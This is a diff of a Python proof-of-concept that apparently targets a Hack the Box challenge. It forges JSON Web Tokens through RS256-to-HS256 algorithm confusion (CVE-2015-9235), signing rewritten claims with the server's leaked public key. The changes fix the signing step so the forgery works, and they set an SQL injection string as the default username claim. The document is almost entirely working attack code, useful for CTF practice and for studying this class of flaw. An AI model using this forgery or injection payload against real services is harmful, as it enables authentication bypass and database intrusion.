@@ -4,23 +4,25 @@
 import base64
 import argparse
 import json
-from codecs import encode, decode
 import hashlib
 import hmac
 from colorama import Fore
 
 #Take user input
 parser = argparse.ArgumentParser(description="JWT Confusion CVE-2015-9235 PoC for the Hack the Box challenge - Under Construction")
-parser.add_argument("token_location", type=str, help="location of JWT token (must include 'pk' payload)")
-parser.add_argument("claim_key", type=str, help="payload claim to target")
-parser.add_argument("claim_value", type=str, help="new claim value")
+parser.add_argument("token_location", type=str, help="location of JWT token (must include 'pk' payload)", default="./token",nargs="?")
+parser.add_argument("claim_key", type=str, help="payload claim to target", default="username",nargs="?")
+parser.add_argument("claim_value", type=str, help="new claim value", default='''‘ or 1=1;–''',nargs="?")
 args = parser.parse_args()
+
+#Debugging only
+# args = parser.parse_args(["./token","username","burp"])
 
 #Load token
 print(Fore.YELLOW + "TOKEN DIR:" + args.token_location + Fore.RESET)
 token_file = open(args.token_location, "r")
 token = token_file.read()
-token_file.close
+token_file.close()
 print()
 
 #Split token into parts (header, payload, signature)
@@ -29,22 +31,24 @@ token_parts = []
 for parts in token.split("."):
     token_parts.append(parts)
 
-token_header = token_parts[0]
-token_payload = token_parts[1]
-token_signature = token_parts[2]
+encoded_header = token_parts[0]
+encoded_payload = token_parts[1]
+encoded_signature = token_parts[2] #dont need this
 
-decoded_header = base64.urlsafe_b64decode(token_header).decode('UTF-8')
+decoded_header = base64.urlsafe_b64decode(encoded_header).decode('UTF-8')
 
-#Pull public key from payload (HTB Under Construction)
-decoded_payload = base64.urlsafe_b64decode(token_payload).decode('UTF-8')
+#Pull public key from returned jwt payload
+decoded_payload = base64.urlsafe_b64decode(encoded_payload).decode('UTF-8')
 decoded_payload_json = json.loads(decoded_payload)
 public_key = decoded_payload_json.get('pk')
+
+#Removes extra claims from payload for troubleshooting
+#decoded_payload_json.pop('pk')
+#decoded_payload_json.pop('iat')
 
 #Print Original Decoded JWT
 print(Fore.YELLOW + "ORIGINAL TOKEN:" + Fore.RESET)
 print(token)
-print(Fore.YELLOW + "SIGNATURE:" + Fore.RESET)
-print(token_signature)
 print(Fore.YELLOW + "HEADER: "  + Fore.RESET)
 print(decoded_header)
 print(Fore.YELLOW + "PAYLOAD: "  + Fore.RESET)
@@ -52,7 +56,7 @@ print(json.dumps(decoded_payload_json))
 print(Fore.YELLOW + "PUBLIC KEY: "  + Fore.RESET)
 print(public_key)
 
-print("---------------------------------------------------------------\n")
+print(Fore.GREEN + "-------------------------------------------NEW TOKEN-------------------------------------------\n" + Fore.RESET)
 
 #Create new header (change from RS256 -> HS256)
 header = '{"alg":"HS256","typ":"JWT"}'
@@ -66,32 +70,34 @@ print()
 #print(headerEncodedBytes)
 encodedHeader = str(headerEncodedBytes, "utf-8").rstrip("=")
 
-#Create new payload with claim replaced (key and value)
+#Create new payload with claim replaced by user input (key and value)
 claim = args.claim_key
 decoded_payload_json[claim] = args.claim_value
 
 payload = json.dumps(decoded_payload_json)
-print(Fore.YELLOW + "NEW PAYLOAD: " + Fore.RESET)
-print(payload)
 payloadEncodedBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
-print(Fore.GREEN + "ENCODED: " + Fore.RESET)
+encodedPayload = str(payloadEncodedBytes, "utf-8").rstrip("=")
+
+print(Fore.YELLOW + "NEW PAYLOAD: " + Fore.RESET)
+print(payload + "\n")
+print(Fore.GREEN + "ENCODED PAYLOAD: " + Fore.RESET)
 print(payloadEncodedBytes)
 print()
-encodedPayload = str(payloadEncodedBytes, "utf-8").rstrip("=")
 
 #Create new token
 newToken = (encodedHeader + "." + encodedPayload)
 
-print()
-
+#Create new signature
 sig = base64.urlsafe_b64encode(
-    hmac.new(public_key.encode(),token.encode(),
-    hashlib.sha256).digest()).decode('UTF-8').strip("=")
+    hmac.new(bytes(public_key, "UTF-8"),newToken.encode('utf-8'),
+    hashlib.sha256).digest()
+    ).decode('UTF-8').rstrip("=")
 
-print(Fore.YELLOW + "NEW SINGATURE: " + Fore.RESET)
+print(Fore.GREEN + "ENCODED SINGATURE: " + Fore.RESET)
 print(sig + "\n")
 
-#Print new token
-token = newToken + "." + sig
+#Create new token
+newToken = newToken + "." + sig
+
 print(Fore.YELLOW + "NEW TOKEN: " + Fore.RESET)
-print(token)
+print(newToken)
